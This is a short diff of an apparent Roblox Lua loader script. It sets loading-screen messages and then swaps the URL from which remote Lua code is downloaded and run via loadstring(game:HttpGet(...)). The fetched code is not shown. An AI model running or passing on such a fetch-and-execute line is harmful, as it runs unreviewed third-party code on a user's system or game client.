@@ -5,4 +5,4 @@ _G.FirstText = "Script Preparing..."
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 10
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
